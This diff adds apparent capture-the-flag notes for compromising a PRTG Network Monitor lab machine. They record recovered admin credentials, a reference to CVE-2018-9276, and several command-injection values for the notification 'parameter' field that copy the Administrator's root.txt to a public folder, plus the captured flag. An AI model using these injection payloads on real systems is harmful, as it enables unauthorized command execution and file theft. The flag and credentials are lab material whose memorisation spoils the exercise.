@@ -1,0 +1,28 @@
+#10.10.10.152
+#Inside ftp server
+#found credentials inside "users\All users\paessler\PRTG Network Monitor\PRTG Configuration.old.bak"
+#USER= prtgadmin
+#PASSWD= PrTg@dmin2018 -->  PrTg@dmin2019
+
+#log in to website with creds
+
+#follow this blog  (CVE-2018-9276)
+>>>https://www.codewatch.org/blog/?p=453
+
+#go to 'Setup --> Account Setting --> Notification'
+#now add new notification
+#in notification section when we add new notification, enable "Execute Program" button (scroll down)
+#there is "Code Execution vulnerability" in the 'parameter' field of 'Execute Program' section 
+#there are 2 demo executable script files (.bat,  .ps1), choose .ps1 executable
+#add this command in "parameter" field of "Execution Program" option
+
+test.txt; Copy C:\Users\Administrator\Desktop\root.txt C:\Users\Public\cred.txt
+C:\\Users\\Public\\user.txt; Copy C:\\Users\\Administrator\\Desktop\\root.txt > C:\\Users\\Public\\cred.txt
+C:\\Users\\Public\\user.txt; Copy C:\\Users\\Administrator\\Desktop\\root.txt > C\\Users\\Public\\root.txt
+file.txt; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\my.txt" -Recurse
+"C:\Users\Public\user.txt"; Copy-item "C:\Users\Administrator\Desktop\root.txt" -Destination "C:\Users\Public\test111.txt" -Recurse
+
+
+#key
+3018977fb944bf1878f75b879fba67cc
+
